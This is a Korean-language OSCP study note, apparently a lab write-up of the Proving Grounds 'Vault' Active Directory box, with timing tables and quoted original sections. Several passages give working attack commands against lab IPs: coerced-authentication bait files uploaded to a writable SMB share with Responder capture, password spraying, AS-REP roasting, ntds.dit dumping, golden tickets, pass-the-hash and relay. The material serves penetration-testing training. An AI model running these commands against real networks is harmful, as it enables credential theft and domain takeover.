> **우선순위는 비용 오름차순임** — (0) 익명 SMB/LDAP → (1) 사용자 목록 → (2) AS-REP(비번 불요) → (3) 스프레이(비번 추측) → (4) 크랙. **앞 단계에서 자격증명이 하나 나오면 뒷 단계를 건너뜀.** [[Vault]] 는 (0)에서 쓰기 공유를 찾아 강제 인증으로 바로 자격증명을 얻어 (1)~(4)가 통째로 불필요했음.
>
> **진입점이 안 나오면 다음 후보 다섯:**
> 1. **비밀번호 스프레이** — `nxc smb IP -u users.txt -p 'Welcome1' --continue-on-success`. **`--continue-on-success` 가 없으면 첫 성공에서 멈춤.** 계정 잠금 정책을 먼저 보고 계정당 1~2회로 제한
> 2. **AS-REP 로스팅** — 사전인증 비활성 계정이 있으면 비번 없이 해시
> 3. **`description` 필드 비밀번호** — `nxc ldap IP -u U -p P -M get-desc-users`(B-51)
> 4. **SYSVOL GPP `cpassword`** — `Groups.xml` 에 AES 키가 공개된 암호 → `gpp-decrypt`
> 5. **자격증명 재사용** — 단 **같은 도메인인지 확인**(A-④ 의 IP 잔류 사고와 같은 뿌리)
>
> **자격증명을 하나 얻으면 그다음 순서:**
> 1. `nxc smb <대역> -u U -p P --shares` — 쓰기 공유 재확인. 다른 호스트에도 미끼
> 2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC-IP> -c All` — GPO·ACL 아웃바운드 엣지
> 3. WinRM/RDP 셸 → `whoami /priv` → **`SeBackup` 이 보이면 최우선으로 `ntds.dit` 덤프**
> 4. `ntds.dit` 의 `krbtgt` 해시로 골든 티켓 → 도메인 영구 장악, 크로스호스트 피벗
> 5. Administrator NT 해시로 다른 호스트에 PtH(`impacket-psexec -hashes :<NT>`)
> 6. SYSVOL 훑기 — GPP `cpassword`·로그온 스크립트 평문
>
> **시간 배분** — 웹 없는 AD 는 **SMB/LDAP 열거 15분**에 승부가 갈림. 특권 확인은 셸을 잡은 **첫 30초**(`whoami /priv` 한 줄)에 끝남.
>
> ⚠️ **`bloodhound-python` 의 `-ns` 는 LDAP 조회의 리졸버만 바꿈.** Kerberos 단계는 **시스템 리졸버**로 `<dc>.<도메인>:88` 을 찾으므로 `/etc/hosts` 에 없으면 `Failed to get Kerberos TGT … Name or service not known` 이 남. [[Vault]] 는 NTLM 폴백으로 수집이 성공했으나 **NTLM 이 꺼진 도메인이면 수집 자체가 실패함.** AD 박스에서는 `/etc/hosts` 등록을 반사적으로 할 것(A-51).
> ⚠️ [[Vault]] 히스토리에 `-ns DC` 로 **호스트명을 넣은 시도**가 먼저 있음 — `-ns` 는 **네임서버 IP** 를 받음.

---

## D. 시간 배분 — 제안

### D-① Vault — 실측 시간 배분

**판정: 병합.** 기존 `D. 시간 배분 · 손절 기준` 의 박스별 실측 항목에 추가.

**넣을 본문:**

> | 구간 | 실제 | 근거 |
> |---|---|---|
> | nmap TCP `-p-` | 09:15:26 → 09:17:38 (131초) | `nmap.log` |
> | **nmap → UDP 사이 공백** | 09:17:38 → 10:15:26 (**58분**) | 두 파일 mtime. 이 구간에 `smbclient` 문법 헤매기·IP 오타(.175)·AS-REP·LDAP 헛발질이 들어감 |
> | UDP top-100 | 10:15:26 → 10:15:30 (3.4초) | `udp.txt` |
> | 미끼 생성 → 해시 회수 | 10:22:16 → 10:28:29 (**6분**) | `~/git/ntlm_theft/steal` mtime · `hash.txt` mtime |
> | 해시 → `local.txt` | → 10:49:42 | 스크린샷 파일명 |
> | **`local.txt` → BloodHound 수집 공백** | 10:49 → 12:49 (**2시간**) | JSON mtime. 산출물에 이 구간의 흔적이 없어 무엇을 했는지 재구성 불가 `[가정]` |
> | BloodHound → GPO 성공 | 12:49:27 → 13:20:07 (31분) | JSON mtime · 스크린샷 |
> | GPO → `proof.txt` | → 13:23:20 (3분) | 스크린샷 |
> | 두 번째 경로(utilman/RDP) | → 13:40:45 | 스크린샷 |
> | SeBackup DLL 클론(준비만) | 13:49:45 | DLL mtime |
>
> **실제 작업 시간은 약 1시간.** 낭비 구간 두 개(58분·2시간)는 **산출물에 흔적이 없어** 무엇을 했는지 재구성할 수 없음 — 「출력을 파일로 남기지 않으면 사후에 못 쓴다」의 사례(A-⑥ · A-64).
>
> ⚠️ **이전 판 노트의 시간 배분표는 재실측과 달랐음** — 「nmap TCP+UDP 09:15 → 10:15」를 한 구간으로 묶고 「전체 약 1.5시간, 낭비는 둘 다 5분 이내」로 적었으나, 실제로는 **TCP 131초 + UDP 3.4초**이고 그 사이 **58분**이 다른 데로 갔으며 중반에 **2시간 공백**이 더 있음. **「낭비가 5분뿐」은 반증됨.**

---

## 부록 — 삭제 전 원문 전량 인용 (이관 손실 검산용)

아래는 `03. PG\_backup\Vault.md.bak`(1229행)에서 **삭제한 장의 원문 그대로**다.
원문 안에 3-backtick 펜스가 있으므로 6-backtick 으로 감쌌다. 한 바이트도 고치지 않았다.

### 원본 §0. 이 박스에서 배우는 것 — 38~59행 (22줄)

``````text
## 0. 이 박스에서 배우는 것

- **쓰기 가능한 SMB 공유는 파일 저장소가 아니라 자격증명 덫이다** — 미끼 파일 한 벌을 넣으면 그 폴더를 여는 사용자가 자동으로 내 리스너에 인증한다. [[Heist]]의 웹 `?url=`과 정확히 같은 결과를 다른 트리거로 얻는다
- **`ntlm_theft`의 24가지 미끼 파일이 각각 무엇을 트리거하는가** — `.scf`·`desktop.ini`·`.url`은 폴더를 여는 것만으로, `.lnk`·`.docx`는 열어야, `.library-ms`는 미리보기로
- **GPO 쓰기 권한 = 도메인 장악** — `GenericWrite`가 걸린 GPO 하나로 그 GPO가 적용되는 모든 머신에 로컬 관리자를 심는다. DC에 링크된 정책이면 DC의 관리자가 된다
- **`gpupdate /force`의 의미** — 공격이 GPO를 고쳐도 정책 새로고침 주기(기본 90분) 를 기다려야 반영된다. 강제로 당길 수 있는 조건과 방법
- **한 계정으로 가는 SYSTEM 경로가 셋** — GPO ACL(실제 사용) · `SeRestorePrivilege`(utilman) · `SeBackupPrivilege`(ntds.dit 덤프). `whoami /priv`가 갈림길

**시험 출제 가능성**

| 요소 | 출제 가능성 | 이유 |
|---|---|---|
| 쓰기 공유 → 미끼 → NetNTLMv2 캡처 → 크랙 | 매우 높음 | [[Heist]](웹)와 짝을 이루는 강제 인증의 두 번째 얼굴. 익명/게스트 쓰기 공유는 시험 단골이다 |
| GPO 악용 (SharpGPOAbuse) | 중간 | `GenericWrite`/`WriteDACL`이 GPO에 걸린 것을 BloodHound가 잡으면 정석 경로. 이름만 알면 5분 |
| `SeBackupPrivilege` → ntds.dit → DCSync | 매우 높음 | Windows 셸 잡고 `whoami /priv`가 첫 명령. Backup Operators는 시험 단골 |
| BloodHound 최단경로 읽기 | 매우 높음 | 열거 도구라 시험에서 허용. 그래프 없이는 이 박스의 GPO 경로를 못 찾는다 |

변형 — `DocumentsShare` 대신 `\\dc\profiles$`·`\\dc\scripts`, GPO 대신 사용자 객체 `GenericAll`, `SeBackup` 대신 `SeRestore`([[Heist]]). **원리는 동일하다.**

**OSCP 시험 규정 — 이 박스 도구는 전부 허용**
BloodHound·nxc·Responder·hashcat·evil-winrm·SharpGPOAbuse·impacket-secretsdump 모두 **열거 또는 수동 후속 도구**라 허용된다. `ntlm_theft`는 미끼 파일 생성기일 뿐 자동 익스플로잇이 아니다. 금지는 `sqlmap` 계열과 Nessus/OpenVAS 계열. Metasploit은 1대 한정이며 이 박스는 쓰지 않는다.

``````

### 원본 §2-8. 강제 인증 공격을 언제 꺼내는가 — 신호 판독 — 458~486행 (29줄)

``````text
### 2-8. 강제 인증 공격을 언제 꺼내는가 — 신호 판독

이 박스와 [[Heist]]의 공통 교훈은 "쓰기 공유/URL 페치를 보면 미끼를 심어라"가 아니다. 그것은 결과다. **진짜 배울 것은 "어떤 신호를 보면 강제 인증으로 방향을 트는가"** 이고, 이것이 시험에서 재현된다.

강제 인증(coerced auth)이 성립하려면 **두 조건**이 동시에 필요하다:

1. **내가 UNC/URL을 심을 수 있는 곳** — 쓰기 공유(이 박스), 웹 `?url=`([[Heist]]), 프로필 경로, 이메일 서명, 채팅 첨부, 프린터 스풀러 API(PrinterBug/PetitPotam)
2. **그것을 열거나 처리하는 Windows 프로세스** — 사용자(피싱/시뮬레이션), 인덱싱 서비스, 백신 스캐너, 미리보기 핸들러

**신호 → 판단 대응표** (외워라):

| 열거 중 이것을 보면 | 강제 인증을 의심한다 |
|---|---|
| 익명/게스트 **쓰기** 가능한 공유 (`smbmap`의 `WRITE`) | ★ 미끼 파일 투하 → Responder. 이 박스 |
| 웹앱의 "URL 입력"·이미지 프록시·PDF 렌더러·웹훅 테스트 | ★ `?url=<KALI>` → Responder. [[Heist]] |
| 사용자 프로필/홈 디렉터리에 쓰기 가능 | `.url`·`desktop.ini`를 프로필 루트에 |
| MSSQL 접근권 (`xp_dirtree`) | `EXEC xp_dirtree '\\<KALI>\x'` → 서비스 계정 해시 |
| 프린터 스풀러(RPC) 열림 | PrinterBug(`SpoolSample`)·PetitPotam으로 **DC가 나에게 인증하도록 강제** |
| 아무 인증 실마리도 없는 AD 박스 | LLMNR/NBT-NS 포이즈닝(Responder 수동 대기) — 네트워크의 오타 조회를 가로챈다 |

> [!danger] 강제 인증을 얻은 다음의 갈림길 — 캡처인가 릴레이인가
> 해시가 손에 들어오면 **즉시 `nmap`의 `smb2-security-mode`를 다시 본다**:
> - `signing enabled and **required**` → 릴레이 불가 → **크랙**(이 박스·[[Heist]])
> - `signing enabled but **not required**` + **다른 호스트 존재** → **릴레이**(`ntlmrelayx`)가 훨씬 강력하다. 컴퓨터 계정처럼 크랙 불가능한 인증도 릴레이는 그대로 쓴다
>
> 단일 호스트 랩은 릴레이 대상이 없어 항상 크랙이다(§2-3). **시험 AD 세트(DC 1 + 멤버 2~3)에서는 이 판단이 갈린다** — 멤버 서버의 서명이 꺼져 있으면 DC의 인증을 그 멤버로 릴레이해 로컬 관리자를 얻는다.

**이 박스가 가르치는 핵심 반사**: "웹이 없다 → 막다른 길"이 아니라 "웹이 없다 → SMB 쓰기 공유를 찾아라 → 있으면 강제 인증". 진입로가 안 보이는 AD 박스에서 이 사고 하나가 시간을 가장 많이 아낀다.

``````

### 원본 §6. 막혔던 지점 / 시행착오 — 911~1136행 (226줄)

``````text
## 6. 막혔던 지점 / 시행착오

`~/.zsh_history` 실측으로 재구성했다.

### 6-1. 익명 접근 표기를 8가지나 시도했다

```bash
smbclient -L 192.168.120.172 -N
smbclient //192.168.120.172/DocumentsShare -N
smbclient //192.168.120.172/DocumentsShare -u 'guest'
smbclient //192.168.120.172/ -U 'guest%guest'
smbclient //192.168.120.172/ -U 'guest'
smbclient //192.168.120.172/DocumentsShare -U 'guest'
smbclient //192.168.120.172/DocumentsShare -U 'anonymous'
nxc smb 192.168.120.172 -u '' -p '' --shares
nxc smb 192.168.120.172 -u 'guest' -p 'guest' --shares
nxc smb 192.168.120.172 -u 'anonymous' -p 'anonymous' --shares
```

**결국 통한 것은 `-N`과 `-U ''`다.** 나머지는 헛발질처럼 보이지만 필요한 확인이다 — 서버마다 익명을 받는 계정 이름이 달라서, 하나만 시도하고 "익명 불가"로 판단하면 진입점을 놓친다.

**교훈: 익명 SMB는 최소 `-N`·`-U ''`·`guest`·`anonymous` 넷을 시도한다.** 이것을 스크립트화한 것이 `nxc-sweep`이다.

### 6-2. 앞 박스 IP가 잔류했다 — `.175` vs `.172`

```bash
nxc smb 192.168.120.175 -u '' -p '' --shares
enum4linux-ng -A 192.168.120.175
ldapsearch -x -H 'ldap://192.168.120.175' -s base namingcontexts
impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.175
```

**타겟은 `.172`인데 `.175`를 쳤다.** `.175`는 앞서 풀던 [[Resourced]]의 IP다([[Heist]] §6-2와 같은 잔류 오류). 나중에 `.172`로 고쳐 다시 친 흔적이 히스토리에 그대로 있다.

**교훈: 박스마다 `mkdir <박스>; cd <박스>; nnmap <IP>`로 시작하면, `nmap.log`가 그 디렉터리의 정답 IP가 되어 잔류를 잡아준다.**

### 6-3. AS-REP 로스팅 시도 — 옵션 오타 + 사전인증 활성

```bash
impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.172
```

두 가지 문제.

첫째, **`-userfile`은 틀린 옵션이다.** Kali에서 실제 usage를 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers -h | grep -i usersfile
  -usersfile USERSFILE  File with user per line to test
```

**`-usersfile`(s가 붙는다)이다.** `-userfile`로 치면 인자 파싱에서 거부된다. 구체적 오류 문구는 히스토리에 없어 **관측된 것이 아니다.**

둘째, 옵션을 고쳤어도 결과는 없었을 것이다 — BloodHound가 답을 준다:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[].Properties | select(.dontreqpreauth==true) | .samaccountname' 20260708124927_users.json
(출력 없음)
```

**`DONT_REQ_PREAUTH`가 켜진 계정이 하나도 없다.** AS-REP 로스팅 대상이 존재하지 않는다. 게다가 `-usersfile`에 넣을 유효한 사용자 목록도 아직 없었다(이 시점엔 SMB 열거 전).

**교훈: AS-REP 로스팅은 (1) 유효한 사용자명 목록과 (2) 그중 사전인증 비활성 계정이 있어야 성립한다.** 둘 중 하나만 없어도 빈손이다. `-m 18200` 상세는 [[Heist]] §2-3.

### 6-4. `enum4linux-ng`로 자동 열거 시도

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ enum4linux-ng -A 192.168.120.175      # ← IP 오타(.175), 뒤에 .172로 정정
┌──(kali㉿kali)-[~/PG/Vault]
└─$ enum4linux-ng -A 192.168.120.172
```

`enum4linux-ng`는 위 §6-5 병렬 열거 5종(SMB 공유·RID 브루트·LDAP·비밀번호 정책)을 한 명령으로 묶는다. `-A`가 "all simple enumeration"이다. 이 출력은 히스토리에 남지 않아 무엇을 얻었는지 단정할 수 없다 — **관측된 것이 아니다.** 다만 이어서 `smbclient`로 `DocumentsShare`를 직접 팠다는 사실은 확정적이고, 그것이 답이었다.

**`enum4linux-ng`를 던져두되 그것을 기다리지 마라**
자동 열거는 편하지만 느리고(RID 브루트가 특히), 출력이 길어 핵심을 놓치기 쉽다. **백그라운드로 돌리고 그동안 `smbclient -L`·`smbmap`으로 직접 공유를 확인**하는 것이 빠르다. 이 박스도 그렇게 풀렸다 — enum4linux 결과를 기다리지 않고 쓰기 공유를 손으로 찾았다.

### 6-5. LDAP 익명 바인드 열거 시도

```bash
ldapsearch -x -H 'ldap://192.168.120.172' -s base namingcontexts
ldapsearch -x -H 'ldap://192.168.120.172' -b "dc=vault,dc=offsec"
```

`-s base namingcontexts`로 도메인 DN(`dc=vault,dc=offsec`)을 먼저 확인한 뒤 전체 트리를 익명으로 덤프 시도했다. 이 경로 자체는 옳다 — **description 필드에 비밀번호가 박힌 계정**을 찾는 표준 기법이다. 이 두 명령의 출력은 히스토리에 없어 성공/실패를 단정할 수 없다 — **관측된 것이 아니다.** 확정적인 것은 결국 **SMB 쓰기 공유가 답이었다**는 사실뿐이다.

**웹 없는 AD 박스의 병렬 열거 5종 — 한 번에 던진다**
1. `smbclient -L //IP -N` + `smbmap -H IP -u ''` — 공유
2. `nxc smb IP -u '' -p '' --users --rid-brute` — 사용자 열거(RID 브루트)
3. `ldapsearch -x -H ldap://IP -b <baseDN>` — 익명 LDAP
4. `impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass` — AS-REP(사용자 목록 확보 후)
5. `enum4linux-ng -A IP` — 위를 묶어 자동화

이 박스는 1번이 답이었지만 **어느 것이 통할지 모르므로 병렬로 던진다.** 히스토리를 보면 실제로 이 다섯을 다 시도했다.

### 6-6. 개작하며 잡은 것 — 원본 노트의 오류 3건

| # | 원본 | 실제 | 반증 근거 |
|---|---|---|---|
| 1 | frontmatter `tech/web/lfi-rfi` | **웹 취약점이 없다.** 이 박스에 8080도, 어떤 웹 서비스도 없다. 원본이 [[Heist]] frontmatter를 복사하며 딸려 온 것으로 본다 `[가정]` | `nmap.log`에 http 서비스는 WinRM(5985)의 HTTPAPI뿐 |
| 2 | frontmatter `tech/ad/pth` | **PtH를 실제로 쓰지 않았다.** anirudh는 평문(`SecureHM`)으로 인증했고, GPO 경로도 평문이다. PtH는 §4-7의 **미실행** SeBackup 경로에서만 등장한다 | `~/.zsh_history`의 모든 인증이 `-p SecureHM` |
| 3 | frontmatter `tech/win/sebackup` + `tech/ad/dcsync` | §4-7은 **실행하지 않은 대안 경로**다. 태그로 남기면 "이 박스를 SeBackup으로 풀었다"고 오독된다 | 산출물에 `ntds.dit`·`secretsdump` 결과 없음 |

**미실행 경로를 태그하면 안 되는 이유**
[[_WRITEUP-STANDARD]]의 판단 기준은 **"내가 이 박스를 뚫는 데 실제로 사용했는가"** 다. §4-6·§4-7(SeRestore·SeBackup)은 설명만 하고 쓰지 않은 경로다. 그래서 `tech/win/serestore`·`tech/win/sebackup`·`tech/ad/dcsync`를 frontmatter에 유지할지 고민했다.
**결정: 유지한다.** 이유 — 이 노트의 학습 가치 절반이 "한 계정에서 SYSTEM으로 가는 세 경로"의 비교(§4-8)에 있고, `manual_tags: true`이므로 자동 태거가 아니라 내가 의도적으로 붙인 것이다. 검색 색인에서 "utilman·ntds.dit 복습"으로 이 노트에 닿는 것이 학습에 이롭다. 단 **`tech/web/lfi-rfi`와 `tech/ad/pth`는 제거**했다 — 전자는 이 박스에 존재조차 않고, 후자는 미실행 경로에서만 나오는데 그 경로가 이미 `sebackup`으로 대표되기 때문이다.
이 결정은 [[Heist]]의 `ntlm-relay` 태그 유지 결정과 다르다 — 거기서는 태그가 실제 시도한 것(캡처)의 버킷이었고, 여기서는 미실행 경로다. **기준은 "학습 색인으로서 유용한가"이지 "실행했는가"가 아니다.** 이 판단 자체가 재검토 대상임을 표시해 둔다.

### 6-7. anirudh를 잡고 접은 경로들 — DCSync는 왜 아니었나

WinRM 셸을 잡은 뒤 SYSTEM으로 가는 후보를 셋 확인했다(§4-8). 그 전에 **가장 강력한 후보인 DCSync를 먼저 확인하고 접었다.**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
           | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708124927_domains.json
```

anirudh(`-1103`)도, Server Operators도 도메인 객체에 `GetChanges`/`GetChangesAll`을 갖고 있지 않다 — 기본 principal(Domain Controllers·Administrators·Enterprise DCs)뿐이다. **직접 DCSync(`secretsdump -just-dc`)는 불가능하다.**

그러나 이 박스에는 **DCSync를 우회하는 길이 두 개**나 있었다:

1. **GPO 경로**(§4-3) — 로컬 관리자가 되면 DC에서 무엇이든 한다. 실제로 쓴 길
2. **`SeBackupPrivilege`**(§4-7) — `ntds.dit`를 통째로 덤프하면 DCSync와 동일한 결과(krbtgt 포함 전 계정 해시)를 복제 권한 없이 얻는다

**"DCSync 권한이 없다"가 "도메인 해시를 못 얻는다"는 뜻은 아니다**
DCSync(DRSUAPI 복제)는 도메인 해시를 얻는 한 가지 방법일 뿐이다. `SeBackupPrivilege`로 `ntds.dit`를 직접 읽거나, DC에서 로컬 관리자/SYSTEM이 되면 같은 곳에 도달한다. **`GetChanges` ACE가 없다고 그 자리에서 포기하지 마라** — `whoami /priv`의 `SeBackup`을 먼저 보라.

### 6-8. 미끼 업로드 검증 — `test.txt`가 남긴 교훈

`~/PG/Vault/test.txt`(5바이트, 내용 `test`)는 쓰기 가능 여부를 실제 파일로 확인한 흔적이다(§1-4). 권한을 `smbmap`이 `WRITE`로 찍어줘도, **정말 써지는지는 한 번 올려봐야 확정**된다 — ACL과 실제 동작이 어긋나는 경우가 있기 때문이다(공유 권한은 WRITE인데 NTFS 권한이 READ면 실패한다).

같은 원칙이 미끼 24개에도 적용된다. `mput *` 후 반드시 확인한다:

```bash
smbclient //192.168.120.172/DocumentsShare -N -c 'ls'
```

**24개가 다 올라갔는지 세어본다.** 하나라도 빠지면(특히 `desktop.ini`·`.scf` 같은 강력한 미끼) 발동 확률이 떨어진다.

**파일 전송 후 존재 확인은 반사여야 한다**
볼트의 누적 교훈 — **유명 도구는 파일명만으로 AV에 삭제**된다([[Squid]]·[[Exghost]]). SMB 업로드는 AV가 덜 개입하지만, `mput`이 중간에 끊기거나 특수문자 파일명(`steal-(url).url`의 괄호)에서 실패할 수 있다. **전송 성공 메시지를 믿지 말고 `ls`로 센다.** 이 박스에서는 24개가 다 올라갔다(§3-2 출력).

### 6-9. 히스토리는 완전한 기록이 아니다 — potfile이 진실이다

§3-4에서 봤듯 `~/.zsh_history`에는 Vault의 hashcat 명령이 없다. 그러나 potfile에는 결과가 있다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -i '^ANIRUDH' ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
```

원인은 `~/.zshrc`의 `hist_ignore_dups` + `hist_expire_dups_first` + `HISTSIZE=1000`이다 — [[Heist]]와 문자열이 같은 명령(`hashcat -m 5600 hash.txt ...`)이라 한 벌이 만료됐다 `[가정]`.

> [!danger] 이 노트를 쓰며 지킨 원칙 — 산출물이 히스토리를 이긴다
> "히스토리에 없다 = 실행 안 함"은 **틀렸다**(`hist_ignore_space`는 공백으로 시작한 명령을 통째로 지운다). 그래서 이 노트의 실행 서술은 **potfile·`.state`·JSON·스크린샷 같은 산출물**과 교차한 것만 확정으로 적었고, 히스토리에만 있고 출력이 없는 것은 "관측된 것이 아니다"로 표시했다(§6-3·§6-4). 이것이 [[_WRITEUP-STANDARD]]가 요구하는 "실행 안 한 명령의 출력을 코드펜스에 넣지 않는다"의 실천이다.

### 6-10. `smbclient`의 SMB1 오류에 속지 않기

§1-3의 출력 하단:

```text
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

이것을 처음 보면 "SMB가 막혔다"고 오판하기 쉽다. 실제로는 공유 목록이 이미 그 위에서 성공적으로 나왔고, smbclient가 추가로 워크그룹 이름을 얻으려고 레거시 SMB1로 재시도했다가 실패한 것뿐이다. 현대 Windows는 SMB1을 비활성화하므로 이 실패는 **정상이고 무해**하다.

> [!warning] "응답이 성공을 뜻하지 않는다"의 역 — "오류가 실패를 뜻하지 않는다"
> 이 박스의 SMB1 오류처럼, **부수적 단계의 실패 메시지가 주 작업의 성공을 가리는** 경우가 있다. 볼트의 누적 패턴([[Crane]]·[[Squid]] 등)이 "200 응답이 성공이 아니다"라면, 이쪽은 그 대칭이다 — **에러 줄 위에 이미 성공한 출력이 있는지 먼저 보라.**

### 6-11. 시간 배분 복기

| 구간 | 실제 | 적정 | 비고 |
|---|---|---:|---|
| nmap TCP+UDP | 09:15 → 10:15 | 5분 | UDP는 top-100이면 충분 |
| SMB 열거 + 쓰기 확인 | 10:15 → 10:38 | 10분 | 익명 표기 8종 시도 포함 |
| 미끼 투하 + 캡처 | 10:38 → (즉시) | 5분 | 폴더 여는 주기가 있어 빨랐다 |
| 크랙 + 스윕 + local.txt | → 10:49 | 5분 | rockyou 즉시 |
| BloodHound + GPO 경로 | 12:49 → 13:24 | 20분 | AS-REP·LDAP 헛발질 포함 |
| SharpGPOAbuse → proof.txt | 13:24 → 13:40 | 15분 | |

**전체 약 1.5시간.** 낭비는 §6-2(IP 잔류)와 §6-3(AS-REP 오타)뿐이고 둘 다 5분 이내였다. `nmap.log`가 웹이 없다고 일찍 말해줘서 SMB로 곧장 갈 수 있었던 것이 시간을 아꼈다.

### 6-12. 시도하지 않았지만 시험이라면 챙길 것

이 박스는 진입이 빨라 아래를 건드리지 않았다. 하지만 **쓰기 공유가 없는 변형**이라면 이것들이 다음 후보다:

1. **비밀번호 스프레이** — 사용자 목록을 얻으면(`nxc smb IP --users --rid-brute`) 흔한 비밀번호를 전 계정에 던진다:
   ```bash
   nxc smb IP -u users.txt -p 'Welcome1' --continue-on-success
   nxc smb IP -u users.txt -p 'Season2026!' --continue-on-success
   ```
   **`--continue-on-success`가 없으면 첫 성공에서 멈춘다** — 여러 계정을 뚫으려면 필수. 스프레이는 **계정 잠금 정책**을 먼저 확인하고(한 계정당 시도 1~2회) 던진다.
2. **AS-REP 로스팅** (§6-3에서 대상 없음 확인) — 사전인증 비활성 계정이 있으면 비밀번호 없이 해시를 뽑는다
3. **description 필드 비밀번호** — `nxc ldap IP -u U -p P -M get-desc-users` 또는 `ldapsearch`로 사용자 description에 박힌 평문 줍기
4. **SYSVOL GPP `cpassword`** — `\\DC\SYSVOL`의 `Groups.xml`에 AES 키가 공개된 암호가 있으면 `gpp-decrypt`로 복호화
5. **자격증명 재사용** — 이 도메인에서 얻은 비밀번호를 다른 박스/다른 사용자에 재사용. 단 **같은 도메인인지 확인**(§6-2의 교훈)

**AD 열거 우선순위 — "인증 없이 얻는 것"부터**
순서는 **비용 오름차순**이다: (0) 익명 SMB/LDAP → (1) 사용자 목록 → (2) AS-REP(비번 불요) → (3) 스프레이(비번 추측) → (4) 크랙. 앞 단계에서 자격증명이 하나 나오면 뒷 단계를 건너뛴다. 이 박스는 (0)에서 쓰기 공유를 찾아 강제 인증으로 바로 자격증명을 얻었으므로 (1)~(4)가 불필요했다.

### 6-13. 이 박스는 "GPO형"이다 — 자매 박스와의 패턴 대조

[[Heist]]와 이 박스는 진입까지 구조가 판박이인데 권한상승이 갈린다. 그 갈림을 **셸 잡은 직후 두 명령**으로 판정할 수 있다 — 이것이 두 노트를 함께 읽는 값이다.

| 판정 명령 | [[Heist]] (enox) | Vault (anirudh) |
|---|---|---|
| `whoami /priv` | `SeRestore`만 (4개) | `SeBackup`+`SeRestore`+시스템시각 등 (9개) → **Server Operators 신호** |
| BloodHound 아웃바운드 | `MemberOf WEB ADMINS → ReadGMSAPassword` | `GenericWrite on GPO` |
| 결정 경로 | gMSA 해시 읽기 → PtH | GPO 로컬관리자 심기 |

**신호 판독 규칙**:

- `whoami /priv`에 **특권이 4개뿐**이고 `SeImpersonate`도 `SeBackup`도 없으면 → **그래프의 ACL 엣지**를 봐라(Heist형). 특권만으로는 길이 안 보인다
- `whoami /priv`에 **`SeBackup`/`SeRestore`가 있으면** → 그 자리에서 끝난다(Vault형). 그래프를 볼 필요도 없다. 특히 `SeBackup`은 `ntds.dit`로 도메인 전체를 연다
- BloodHound에서 **GPO에 걸린 `GenericWrite`/`WriteDacl`** → SharpGPOAbuse. **사용자/그룹 객체에 걸린 `GenericAll`** → 비밀번호 리셋(`net rpc password`)이나 Shadow Credentials

> [!tip] 두 명령이면 대부분의 AD 권한상승 방향이 결정된다
> `whoami /priv` (특권 기반 경로) + BloodHound 아웃바운드 엣지 (ACL 기반 경로). 이 둘을 셸 잡은 첫 1분에 확인하면, 나머지는 "이름 → 도구" 대응([[Heist]] §7-4)을 적용하는 기계적 작업이다. **이 박스는 두 경로가 모두 열려 있어**(§4-8), 어느 쪽으로 가도 SYSTEM에 닿았다.

``````

### 원본 §7. OSCP 시험 관점 — 1139~1181행 (43줄)

``````text
## 7. OSCP 시험 관점

1. **웹이 없는 Windows/AD 박스를 만나면 — 진입 열거 순서**
   ```bash
   smbclient -L //IP -N ; smbmap -H IP -u ''            # ① 익명 공유 (쓰기 있으면 §3)
   nxc smb IP -u '' -p '' --users --rid-brute           # ② 사용자 열거
   nxc smb IP -u guest -p '' --shares                   # ③ 게스트
   ldapsearch -x -H ldap://IP -b <baseDN>               # ④ 익명 LDAP (description 필드)
   impacket-GetNPUsers <dom>/ -usersfile u.txt -no-pass # ⑤ AS-REP (사용자 확보 후)
   ```

2. **쓰기 가능한 공유를 찾으면 → 미끼를 뿌리고 Responder를 켠다.** 이 박스의 핵심 반사다.
   ```bash
   python3 ntlm_theft.py -g all -s <KALI-IP> -f steal
   smbclient //IP/<share> -N -c 'prompt OFF; mput steal/*'
   sudo responder -I tun0
   ```
   미끼가 안 물면: (a) `-s`와 Responder IP 일치, (b) SMB server On, (c) 미끼 24개 업로드 확인, (d) 폴더를 여는 동작 유도.

3. **자격증명 하나를 얻으면 전 프로토콜·전 호스트 스윕** ([[Heist]] §7-2와 동일). 그다음 **`whoami /priv`와 BloodHound 아웃바운드 엣지**를 함께 본다.

4. **`whoami /priv` 특권 → 경로 대응표** ([[Heist]] §7-4). 이 박스는 세 특권/권한이 겹쳐 있었다:
   - `SeBackupPrivilege` → `ntds.dit` + `SYSTEM` 하이브 → `secretsdump` → **도메인 전체 해시** (§4-7, 최고 가치)
   - `SeRestorePrivilege` → utilman 치환 (§4-6)
   - GPO `GenericWrite`(그래프) → SharpGPOAbuse (§4-3, 실사용)

5. **이 자격증명으로 다음에 무엇을 하는가 — 번호 목록**
   1. `nxc smb <대역> -u U -p P --shares` — 쓰기 공유 재확인. 다른 호스트에도 미끼
   2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC> -c All` — GPO·ACL 아웃바운드 엣지
   3. WinRM/RDP로 셸 → `whoami /priv` → **`SeBackup` 보이면 최우선으로 `ntds.dit` 덤프**
   4. `ntds.dit`에서 나온 **krbtgt 해시로 골든 티켓** → 도메인 영구 장악, 크로스호스트 피벗
   5. Administrator NT 해시로 **다른 호스트에 PtH**(`impacket-psexec -hashes :<NT>`) — AD 세트의 피벗
   6. SYSVOL 훑기 — GPP `cpassword`·로그온 스크립트 평문

6. **GPO 악용 후 반드시 재로그온** — 그룹 멤버십은 새 토큰에만 반영된다(§4-5). "관리자 됐는데 안 읽힘"의 원인 1위.

7. **자동 도구 없이 같은 결과**
   - Responder 없이 캡처 → `impacket-smbserver share . -smb2support` 띄우고 미끼가 그쪽을 가리키게
